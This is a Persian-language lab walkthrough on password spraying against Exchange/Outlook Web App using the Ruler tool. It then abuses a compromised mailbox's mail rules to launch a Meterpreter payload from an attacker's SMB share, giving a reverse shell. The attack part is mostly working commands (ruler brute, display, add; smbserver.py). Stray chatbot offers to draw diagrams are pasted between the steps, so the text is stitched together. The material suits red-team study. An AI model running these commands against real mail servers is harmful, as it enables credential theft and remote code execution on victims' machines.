
این لابراتوار به یک تکنیک حمله به نام **Password Spraying** می‌پردازد و همچنین نشان می‌دهد چگونه می‌توان **Outlook Web Application** را با سوءاستفاده از **Mail Rules** به منظور گرفتن **Remote Shell** مورد استفاده قرار داد، با استفاده از ابزاری به نام **Ruler**.

**تعاریف:**

**Password Spraying** نوعی حمله **Brute-force** بر روی پسوردها است. در این روش، مهاجم (با کمک یک ابزار) فهرستی از **نام‌های کاربری ممکن** (که از طریق تکنیک‌های **OSINT** علیه یک شرکت هدف یا روش‌های دیگر به دست آمده‌اند) را با چند **پسورد ضعیف و رایج** امتحان می‌کند.

در مقایسه با **Brute-force سنتی**:

- در Brute-force سنتی، ابتدا یک **نام کاربری** انتخاب می‌شود و سپس **تمام پسوردهای موجود در لیست** روی آن نام کاربری امتحان می‌شوند.
    
- بعد از اینکه همه پسوردها برای آن نام کاربری امتحان شد، نام کاربری بعدی انتخاب می‌شود و روند دوباره تکرار می‌گردد.


```
ruler -k --domain offense.local brute --users users --passwords passwords --verbose
```

![[Pasted image 20250923071128.png]]


این متن در اصل می‌گوید که **حمله Password Spraying موفقیت‌آمیز بوده** و کاربری با نام **spotless** با پسورد ضعیف **123456** مورد هدف قرار گرفته است.



**مرور کلی فرآیند:**

اگر حمله **Password Spraying** علیه سرور Exchange موفق باشد و شما **اطلاعات ورود معتبر** به دست بیاورید، می‌توانید با استفاده از ابزار **Ruler** یک **قانون ایمیل مخرب** بسازید که روی ماشینی که صندوق ایمیل به خطر افتاده را بررسی می‌کند، **اجرای کد از راه دور (Remote Code Execution)** به شما بدهد.

**چگونگی کار:**

1. فرض کنید در جریان Password Spraying، **اعتبار کاربر [spotless@offense.local](mailto:spotless@offense.local)** به دست آمده است.
    
2. با کمک **Ruler**، یک **قانون ایمیل مخرب** برای این حساب ایجاد می‌کنید. فرمت قانون شبیه این است:
    
    - اگر **موضوع ایمیل شامل someTriggerWord** باشد، برنامه‌ای که در **pathToSomeProgram** مشخص شده اجرا شود.
        
3. یک ایمیل جدید با **موضوع شامل someTriggerWord** به **[spotless@offense.local](mailto:spotless@offense.local)** ارسال می‌شود.
    
4. کاربر **spotless** وارد سیستم خود شده و Outlook را برای بررسی ایمیل‌ها باز می‌کند.
    
5. ایمیل مخرب دریافت می‌شود و قانون ایمیل فعال می‌شود، برنامه مشخص شده اجرا می‌شود و **payload مخرب** یک **reverse shell** به حمله‌کننده می‌دهد.
    

اگر بخواهی، می‌توانم **یک خلاصه کوتاه و نکات کلیدی برای جزوه** هم برات آماده کنم تا سریع مفهوم این حمله را درک کنی. آیا برات درست کنم؟

### 

Execution

Let's validate the compromised credentials are working by checking if there are any email rules created already:

```
ruler -k --verbose --email spotless@offense.local -u spotless -p 123456  display
```

![[Pasted image 20250923071506.png]]

1. **ساخت payload:** یک **reverse Meterpreter payload** ساخته شده و به صورت یک فایل اجرایی ویندوز (**evilm64.exe**) در مسیر `/root/tools/` ذخیره شده است.
    
2. **ایجاد اشتراک SMB:** حالا باید یک **SMB share** ساخته شود که برای سیستم قربانی قابل دسترسی باشد و مسیر آن به فایلی که payload در آن قرار دارد (**evilm64.exe**) اشاره کند.
    

به زبان ساده: ما فایل مخرب را در سیستمی که کنترل داریم می‌گذاریم و آن را از طریق یک اشتراک شبکه (SMB) در دسترس قربانی قرار می‌دهیم تا در مراحل بعدی توسط قانون ایمیل مخرب اجرا شود.

اگر بخواهی، می‌توانم **یک نمودار ساده جریان حمله از Password Spraying تا اجرای SMB Payload** برات بکشم که راحت‌تر تو جزوه استفاده کنی. آیا برات بکشم؟


```
smbserver.py tools /root/tools/
```

```
ruler -k --verbose --email spotless@offense.local --username spotless -p 123456  add --location '\\10.0.0.5\tools\\evilm64.exe' --trigger "popashell" --name maliciousrule --send --subject popashell
```


![[Pasted image 20250923071706.png]]

![[Pasted image 20250923071752.png]]
